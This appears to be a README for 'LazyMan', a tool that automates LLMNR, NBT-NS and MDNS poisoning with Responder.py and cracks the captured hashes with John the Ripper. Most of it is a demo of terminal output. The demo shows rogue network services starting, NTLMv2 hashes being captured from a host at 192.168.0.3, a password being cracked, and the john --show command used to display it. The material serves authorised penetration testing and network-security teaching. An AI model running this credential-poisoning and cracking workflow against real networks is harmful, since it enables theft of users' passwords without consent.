# LazyMan

Tool used for automatic LLMNR, NBT-NS and MDNS poisoning using Responder.py and cracks the captured hash using John.

Credits:
Laurent Gaffie (Responder.py)
openwall (John the Ripper)

==============================================================================================================================
DEMO:
==============================================================================================================================

    _                ________     ____  __          _   _ 
   | |        /\    |___  /\ \   / /  \/  |   /\   | \ | |
   | |       /  \      / /  \ \_/ /| \  / |  /  \  |  \| |
   | |      / /\ \    / /    \   / | |\/| | / /\ \ | .   |
   | |____ / ____ \  / /__    | |  | |  | |/ ____ \| |\  |
   |______/_/    \_\/_____|   |_|  |_|  |_/_/    \_\_| \_|
                                                          
----------------------------------------------------------
  ++++++++++++++++++++ Version v1 ++++++++++++++++++++++
  +++++++++++++++++++++by RAMIKAN+++++++++++++++++++++++
                                                          
 This Tool Uses Responder and John For Capturing & Cracking Password 
----------------------------------------------------------
                                                          
----------------------------------------------------------
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  +++++++++++++++ Available Interfaces:  +++++++++++++++ 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
----------------------------------------------------------
eth0
lo
wlan0

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
----------------------------------------------------------
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Enter the interface name:wlan0
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
----------------------------------------------------------
  +++++++++++++++ Available IP Addresses: +++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
10.2.228.136
127.0.0.1
192.168.0.10
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
----------------------------------------------------------
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Enter your IP address:192.168.0.10
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
----------------------------------------------------------
++++++++++++++++++ Starting Responder +++++++++++++++++++ 
  ++++++++++++++Hit CTRL +C to stop +++++++++++++++++ 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
----------------------------------------------------------
NBT Name Service/LLMNR Responder 2.0.
Please send bugs/comments to: lgaffie@trustwave.com
To kill this script hit CRTL-C

[+]NBT-NS, LLMNR & MDNS responder started
[+]Loading Responder.conf File..
Global Parameters set:
Responder is bound to this interface: wlan0
Challenge set: 1122334455667788
WPAD Proxy Server: False
WPAD script loaded:  function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}
HTTP Server: ON
HTTPS Server: ON
SMB Server: ON
SMB LM support: False
Kerberos Server: ON
SQL Server: ON
FTP Server: ON
IMAP Server: ON
POP3 Server: ON
SMTP Server: ON
DNS Server: ON
LDAP Server: ON
FingerPrint hosts: False
Serving Executable via HTTP&WPAD: OFF
Always Serving a Specific File via HTTP&WPAD: OFF


[+]HTTP GET request from : 192.168.0.3. The HTTP URL requested was: / 
[+]HTTP NTLMv2 hash captured from : 192.168.0.3
Complete hash is :  hello:::1122334455667788:12D1CC1CAA36A24997ECDAE4B6B39E5B:0101000000000000F0ED5B29FAE9D101210F999A4E29F28F000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000000000000000000
[+]HTTP GET request from : 192.168.0.3. The HTTP URL requested was: / 
[+]HTTP NTLMv2 hash captured from : 192.168.0.3
Complete hash is :  hello:::1122334455667788:0C21BBA399BFD9CB1A6DA57CB92134A2:0101000000000000508E3AA9FAE9D1010B85C13C91DA8D50000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000000000000000000
^C----------------------------------------------------------
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 +++++++++++List of NTLMv2 hashes collected:+++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-----------------------------------------------------------
HTTP-NTLMv2-Client-192.168.0.3.txt
mkdir: cannot create directory `/usr/share/responder/oldhash': File exists
--------------------------------------------------------------------------------
mkdir: cannot create directory `/usr/share/responder/Cracked': File exists
Loaded 1 password hash (NTLMv2 C/R MD4 HMAC-MD5 [32/32])
test             (hello)
guesses: 1  time: 0:00:00:00 DONE (Sat Jul 30 01:38:27 2016)  c/s: 13907  trying: xymyx007# - dollies
Use the "--show" option to display all of the cracked passwords reliably
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Use 'john --show /usr/share/responder/Cracked/hashlist.txt' Command to view the password 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
--------------------------------------------------------------------------------
----------------------------------------------------------
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 +++++++++++++++++++++Happy Cracking+++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
----------------------------------------------------------

john --show /usr/share/responder/Cracked/hashlist.txt

hello:test::1122334455667788:12D1CC1CAA36A24997ECDAE4B6B39E5B:0101000000000000F0ED5B29FAE9D101210F999A4E29F28F000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000000000000000000

1 password hash cracked, 0 left

